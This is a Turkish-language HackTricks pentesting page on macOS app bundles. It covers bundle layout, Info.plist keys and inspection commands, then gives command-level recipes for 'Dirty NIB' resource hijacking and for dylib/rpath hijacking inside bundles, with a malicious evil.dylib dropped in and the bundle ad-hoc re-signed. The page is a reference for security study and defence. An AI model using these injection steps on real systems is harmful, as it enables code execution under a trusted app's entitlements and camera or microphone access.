# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

macOS'taki Bundles; uygulamalar, libraries ve diğer gerekli dosyalar dahil olmak üzere çeşitli kaynaklar için container görevi görür ve bu kaynakların Finder'da tanıdık `*.app` dosyaları gibi tek nesneler olarak görünmesini sağlar. En sık karşılaşılan bundle, `.app` bundle'ıdır; ancak `.framework`, `.systemextension` ve `.kext` gibi diğer türler de yaygın olarak kullanılır.

### Bir Bundle'ın Temel Bileşenleri

Bir bundle içinde, özellikle `<application>.app/Contents/` directory'si dahilinde, çeşitli önemli kaynaklar bulunur:

- **\_CodeSignature**: Bu directory, uygulamanın bütünlüğünü doğrulamak için gerekli code-signing bilgilerini depolar. Code-signing bilgilerini aşağıdaki gibi command'lerle inceleyebilirsiniz:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Kullanıcı etkileşimi gerçekleştiğinde çalıştırılan uygulamanın executable binary dosyasını içerir.
- **Resources**: Görüntüler, belgeler ve arayüz açıklamalarını (nib/xib dosyaları) içeren, uygulamanın kullanıcı arayüzü bileşenleri için kullanılan depodur.
- **Info.plist**: Uygulamanın ana yapılandırma dosyası olarak görev yapar ve sistemin uygulamayı doğru şekilde tanıması ve uygulamayla etkileşim kurması açısından kritik öneme sahiptir.

#### Info.plist İçindeki Önemli Anahtarlar

`Info.plist` dosyası, aşağıdaki anahtarları içeren uygulama yapılandırmasının temel bileşenidir:

- **CFBundleExecutable**: `Contents/MacOS` dizininde bulunan ana executable dosyanın adını belirtir.
- **CFBundleIdentifier**: Uygulama için global bir identifier sağlar ve macOS tarafından uygulama yönetimi için kapsamlı şekilde kullanılır.
- **LSMinimumSystemVersion**: Uygulamanın çalışması için gereken minimum macOS sürümünü belirtir.

### Bundle'ları İnceleme

`Safari.app` gibi bir bundle'ın içeriğini incelemek için şu komut kullanılabilir: `bash ls -lR /Applications/Safari.app/Contents`

Bu inceleme, `_CodeSignature`, `MacOS` ve `Resources` gibi dizinleri ve `Info.plist` gibi dosyaları ortaya çıkarır. Bunların her biri, uygulamanın güvenliğini sağlamaktan kullanıcı arayüzünü ve çalışma parametrelerini tanımlamaya kadar farklı bir amaca hizmet eder.

#### Ek Bundle Dizinleri

Yaygın dizinlerin yanı sıra bundle'lar şunları da içerebilir:

- **Frameworks**: Uygulama tarafından kullanılan bundled framework'leri içerir. Framework'ler, ek kaynaklara sahip dylib'ler gibidir.
- **PlugIns**: Uygulamanın yeteneklerini genişleten plug-in'ler ve extension'lar için kullanılan dizindir.
- **XPCServices**: Uygulama tarafından process dışı iletişim için kullanılan XPC service'lerini barındırır.

Bu yapı, gerekli tüm bileşenlerin bundle içinde kapsüllenmesini sağlayarak modüler ve güvenli bir uygulama ortamı oluşturur.

`Info.plist` anahtarları ve anlamları hakkında daha ayrıntılı bilgi için Apple developer documentation kapsamlı kaynaklar sunar: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Quarantine edilmiş bir bundle ilk kez çalıştırıldığında macOS kapsamlı bir signature verification gerçekleştirir ve bundle'ı rastgele oluşturulmuş bir translocated path üzerinden çalıştırabilir. Kabul edildikten sonra sonraki çalıştırmalarda yalnızca yüzeysel kontroller gerçekleştirilir; `Resources/`, `PlugIns/`, nib'ler vb. içindeki resource dosyaları geçmişte kontrol edilmemiştir. macOS 13 Ventura'dan beri ilk çalıştırmada deep check uygulanır ve yeni *App Management* TCC permission'ı, kullanıcı onayı olmadan third-party process'lerin diğer bundle'ları değiştirmesini kısıtlar; ancak eski sistemler hâlâ savunmasızdır.
- **Bundle Identifier collisions**: Aynı `CFBundleIdentifier` değerini yeniden kullanan birden fazla embedded target (PlugIns, helper tools), signature validation sürecini bozabilir ve zaman zaman URL-scheme hijacking/confusion'a olanak sağlayabilir. Her zaman sub-bundle'ları enumerate edin ve benzersiz ID'leri doğrulayın.

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura'dan önce imzalı bir uygulamadaki UI resource'larını değiştirmek, shallow code signing'i bypass edebilir ve uygulamanın entitlements'ı ile code execution elde edilmesini sağlayabilirdi. Güncel araştırmalar (2024), bunun Ventura öncesi sistemlerde ve un-quarantined build'lerde hâlâ çalıştığını göstermektedir:<sup>[[1]](#references)[[2]](#references)</sup>

1. Target uygulamayı yazılabilir bir konuma kopyalayın (ör. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` dosyasını (veya `NSMainNibFile` içinde bildirilen herhangi bir nib'i), `NSAppleScript`, `NSTask` vb. instantiate eden malicious bir nib ile değiştirin.
3. Uygulamayı başlatın. Malicious nib, victim'ın bundle ID'si ve entitlements'ı (TCC grants, microphone/camera vb.) altında çalışır.
4. Ventura+ ilk launch sırasında bundle'ı deep-verify ederek ve sonraki modification işlemleri için *App Management* permission'ı gerektirerek riski azaltır; bu nedenle persistence daha zordur, ancak eski macOS sürümlerindeki initial-launch attack'ler hâlâ geçerlidir.<sup>[[1]](#references)</sup>

Minimal malicious nib payload örneği (`ibtool` ile xib'yi nib'e compile edin):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundles içinde Framework / PlugIn / dylib Hijacking

`@rpath` aramaları bundled Frameworks/PlugIns'ları tercih ettiğinden, `Contents/Frameworks/` veya `Contents/PlugIns/` içine malicious bir library bırakmak, ana binary library validation olmadan veya zayıf `LC_RPATH` sıralamasıyla imzalandığında load order'ı yönlendirebilir.

İmzalanmamış/ad-hoc bir bundle kötüye kullanılırken tipik adımlar:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notlar:
- `com.apple.security.cs.disable-library-validation` bulunmayan Hardened runtime, third-party dylib'leri engeller; önce entitlements'ı kontrol edin.
- `Contents/XPCServices/` altındaki XPC services çoğu zaman sibling framework'leri yükler; persistence veya privilege escalation yolları için binary'lerini benzer şekilde patch'leyin.

## Hızlı İnceleme Cheatsheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referanslar

- [1] [Process injection'ı görünür hale getirmek: nib dosyalarını kullanarak macOS uygulamalarını exploit etmek (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB ve bundle resource tampering write-up'ı (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
